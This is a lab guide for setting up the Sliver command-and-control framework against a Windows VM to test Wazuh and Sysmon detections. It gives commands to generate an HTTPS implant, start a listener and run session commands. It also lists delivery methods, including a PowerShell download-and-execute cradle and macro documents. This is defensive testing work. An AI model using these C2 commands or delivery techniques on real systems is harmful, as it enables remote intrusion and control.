# Sliver C2 — Setup and Operator Guide

Sliver is the red team command-and-control framework used in this lab. It generates realistic C2 traffic that exercises Wazuh detection rules.

## Why Sliver?

- Free, open-source (BSL license)
- Actively maintained by Bishop Fox
- Supports ARM64 implants natively (required for Windows 11 ARM64)
- Realistic mTLS, HTTP/2, and DNS C2 channels
- Used by real threat actors (CISA advisory 2023) → detections are operationally relevant

## Architecture in This Lab

```
kali-attacker (192.168.64.30)
  └── Sliver Server (operator interface)
        └── HTTPS listener (:443)
              └── Implant on victim-windows (192.168.64.20)
```

## Quick Reference

```bash
# Start Sliver server
sudo sliver-server daemon

# Connect client
sliver

# Generate HTTPS implant for Windows ARM64
sliver > generate --https 192.168.64.30 --os windows --arch arm64 --save /tmp/

# Start HTTPS listener
sliver > https --lport 443

# List active sessions
sliver > sessions

# Interact with session
sliver > use [SESSION_ID]
sliver (session) > whoami
sliver (session) > ps
sliver (session) > ls C:\\Users\\
```

## Implant Delivery Methods (for Documentation)

| Method | Description | Realistic? |
|--------|-------------|-----------|
| HTTP server | Kali serves EXE via Python HTTP server; victim downloads | Low (but simple) |
| SMB share | Kali shares the EXE via smbserver.py | Medium |
| PowerShell download cradle | Victim runs `IEX (New-Object Net.WebClient).DownloadString(...)` | High |
| Weaponized document | Macro in .docx runs download cradle | High (Phase 4+) |

## Detection Triggers

Sliver activity generates the following Sysmon events on the victim:
- EventID 1: implant process creation (parent: cmd.exe or powershell.exe)
- EventID 3: outbound HTTPS connection to 192.168.64.30:443
- EventID 22: DNS query (if using DNS C2 channel)
- EventID 10: LSASS access if `procdump` is used

## Important Safety Note

The Sliver listener is bound to `192.168.64.30` (lab network only). Verify the listener is NOT accessible from the home LAN before running attack simulations.

```bash
# [kali] Verify listener is bound to lab IP only
ss -tlnp | grep 443
# Should show: 192.168.64.30:443, NOT 0.0.0.0:443
```
